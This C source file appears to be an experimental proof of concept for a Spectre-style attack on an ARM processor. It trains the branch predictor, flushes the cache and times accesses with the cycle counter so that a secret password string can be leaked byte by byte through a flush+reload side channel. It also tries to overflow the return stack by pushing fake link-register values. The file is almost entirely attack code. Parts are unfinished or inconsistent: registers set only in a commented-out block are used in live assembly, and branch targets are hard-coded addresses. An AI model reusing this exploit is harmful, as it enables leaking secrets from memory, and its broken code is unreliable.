#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

//first write loadable kernel moduled 
//this enables cycle counter 
//put that on kernel...
//get ko file 

//need to change some stuff 


uint8_t array[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t flush[256*4096];
uint8_t malicious_array[256*4096] = {0};

static int scores[256];
static int cycles[256];

volatile int temp;
int buffer_size = 10;

char * password = "ahello";

/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 60

void flush_size();

void victim(size_t iter)
{
	register int r4 asm("r4") = iter;
	register int r1 asm("r1") =  33 * 4096 + DELTA; //33 is the decimal equivalent of !
	register int r6 asm("r6") =  42 * 4096 + DELTA; //33 is the decimal equivalent of !
	register int r8 asm ("r8") = 23;
	register int r14 asm("r14") = 0; //link register! holds the last return value in the return stack
	

/*	asm volatile(
		".equ attckr_array, malicious_array\n\t"
		".equ buffer, array\n\t"

		"movw   r7, #:lower16:attckr_array\n\t" //store lower 16bits into r2 (ange)
		"movt   r7, #:upper16:attckr_array\n\t" //store upper 16 bits into r2 (ange)
		"add r1, r7, r1\n\t"
		"add r6, r6, r7\n\t"

		"movw   r7, #:lower16:buffer\n\t" //store lower 16bits into r2 (ange)
		"movt   r7, #:upper16:buffer\n\t" //store upper 16 bits into r2 (ange)
		"add r5, r7, r4\n\t"

		"movw   r7, #:lower16:buffer_size\n\t" //add logic to load buffer from memory (ange)
		"movt   r7, #:upper16:buffer_size\n\t" //changed from 'buff' to 'buffer' fixed error when compiling (ailish)
	); */
	
	r14 = 0xabcdef; //overwrite link-register, and then push this onto the stack...
	
	asm volatile(
		"push {r14}" //to overflow return stack??????	
		);
	
	r14 = 0xbcdef0; //overwrite link-register, and then push this onto the stack...
	
	asm volatile(
		"push {r14}" //to overflow return stack??????	
		);
		

	//flush
	flush_size();

	asm volatile ( //if add code above, will need to change addresses
		"ldrb r2, [r7]\n\t"
		"cmp r4, r2\n\t" //compare
		"bcs 0x10474\n\t" //0x10448 points to last instr || conditional branch
		//branch address 

		"add r1, r5, r0\n\t" //
		"ldrb r8, [r6]\n\t" //LOAD SECRET INTO R8

		"b 0x10478\n\t" //move out of function
		"ldrb r8, [r1]\n\t" //assign r3 zero and return
	);
}


static inline uint32_t ccnt_read (void)
{
	uint32_t cc = 0;
	__asm__ volatile ("mrc p15, 0, %0, c9, c13, 0":"=r" (cc));
	return cc;
}

//flush the data cache
void flushLine(uint32_t pointer)
{
	int counter = 0;
	for( int j =0; j < 256*4096; j=j+64){
		uint32_t addr = (uint32_t)&flush[j+DELTA];
		if((pointer & 0xc003ffc0) == (addr & 0xc003ffc0)){
			//printf("value@ %p  has same index as %d flush ==> adrr index : %p\n",pointer,j,&flush[j*4096]);
			temp = flush[j+DELTA];
			counter++;
		}
		if(counter == 3)
			break;
	}
	temp++;
}

void flush_array(){
	for(int i = 0; i < 256; i++) flushLine((uint32_t)&malicious_array[i*4096+ DELTA]);
}

void flush_size(){
  flushLine((uint32_t) &buffer_size);
}

void reloadSideChannel()
{
	volatile int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;
	for(i = 0; i < 256; i++){

		addr = &malicious_array[i*4096 + DELTA];
		time1 = ccnt_read();
		junk = *addr;
		time2 = ccnt_read() - time1;

		// time1 = ccnt_read();
		//junk = array[i*4096 + DELTA];
		//time2 = ccnt_read() - time1;
		//cycles[i] = time2;

		//printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
		if (time2 <= CACHE_HIT_THRESHOLD){
			scores[i]++; /* if cache hit, add 1 for this value */
		}
		if(time2 < cycles[i]) {cycles[i] = time2;}
	}
	junk++;
}

void restrictedAccess(size_t x)
{
	if (x < buffer_size) {
		//return array[x];
		malicious_array[array[x]* 4096 + DELTA] += 65;
	}
	else {
		malicious_array[array[0]* 4096 + DELTA] += 65;
	}
}

int main(int argc, const char **argv) 
{

	volatile int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;

	int malicous = 18;
	int value;
	char val;
	int offset = 0;

	char stolen_psswd[50];


	// Initialize the array
	for(i = 0; i < 256; i++){
		malicious_array[i*4096+ DELTA]=1;
		cycles[i] = 1000;
	}
	//printf("@addr before [33 * 4096 + DELTA] => %d\n",malicious_array[33 * 4096 + DELTA]);
	//printf("@addr before [97 * 4096 + DELTA] => %d\n",malicious_array[97 * 4096 + DELTA]);
	// while(val != '\0'){


	for(int j = 0; j < 100; j++){

		for(i = 0; i < 256; i++) {flush[i*4096+ DELTA]=3;}

		//flush
		flush_size();
		flush_array();

		//train the CPU to take the true branch inside the victim()
		for( i = 0; i < 10; i++){
			flush_size();
			victim(i);

			//printf("\n\nThe value retrieved training is %d\n", value);
		}

		//flush_size();

		flush_array();

		//printf("%s\n",password);
		size_t larger_x = (size_t)((password - (char*)array) + offset);
		victim(larger_x);
		//malicious_array[value * 4096 + DELTA] += 88;

		//printf("\n\nThe value retrieved training is %c\n", value);
		reloadSideChannel();

		//printf("done and value is %d\n",value);
		printf("%d done\n",j);
	}
	printf("\n");
	int max = 0;

	for (i = 0; i < 256; i++){
		if(max < scores[i]){
			max = scores[i];
			val = i;
		}
		if(scores[i] > 0){
			printf("%d has %d number of hits ==> lowest cyles taken %d\n", i,scores[i], cycles[i]);
		}
	}

	printf("\n\nThe character retrieved @offset %d is %c\n",offset, val);
	printf("The number of hits is %d\n", max);

	//printf("@addr after [33 * 4096 + DELTA] => %d\n",malicious_array[33 * 4096 + DELTA]);
	//printf("@addr after [97 * 4096 + DELTA] => %d\n",malicious_array[97 * 4096 + DELTA]);

	//if(val != ' '){
	//   strncat(stolen_psswd, &val, 1);
	//}

	//val = ' ';
	//offset++;
	//}
	//strncat(stolen_psswd,'\0', 1);
	//printf("The password recovered is --> %s\n",stolen_psswd);

	//printf("@addr after %d\n",malicious_array[0 * 4096 + DELTA]);

return 0;
}
